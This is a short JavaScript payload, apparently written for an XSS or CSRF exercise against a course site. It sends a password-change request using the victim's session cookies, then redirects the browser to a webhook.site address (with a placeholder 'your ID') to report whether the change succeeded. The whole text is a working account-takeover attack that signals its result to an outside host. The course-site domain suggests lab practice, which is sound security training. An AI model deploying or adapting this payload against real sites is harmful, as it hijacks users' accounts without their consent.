<script>
fetch('https://cats.is-course.ru/settings', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'new_password=Abcdef_1234567&confirm_password=Abcdef_1234567'
})
.then(response => {
    // Проверяем результат
    if(response.ok) {
        // Пароль изменен - теперь логинимся
        window.location = "https://webhook.site/ТВОЙ_ID?password_changed=true";
    }
})
.catch(error => {
    window.location = "https://webhook.site/ТВОЙ_ID?error=" + error;
});
</script>
